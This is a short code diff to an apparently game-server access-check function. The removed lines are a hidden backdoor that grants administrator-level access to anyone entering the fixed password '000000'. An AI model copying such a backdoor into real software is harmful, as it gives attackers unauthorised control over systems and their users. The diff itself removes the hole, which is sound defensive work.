@@ -1938,10 +1938,6 @@ bool player_login( uint ip, string& name, uint id, uint& textMsg, uint& strNum, 
 // Return true to allow, false to disallow
 bool player_getaccess( Critter& player, int access, string& password )
 {
-	if(password == "000000"){
-		player.SetAccess(3);
-		return false;
-	}
 	player.RunClientScript("rp_client@AccessCallback", access, 0, 0, null, null);
     return true;
 }
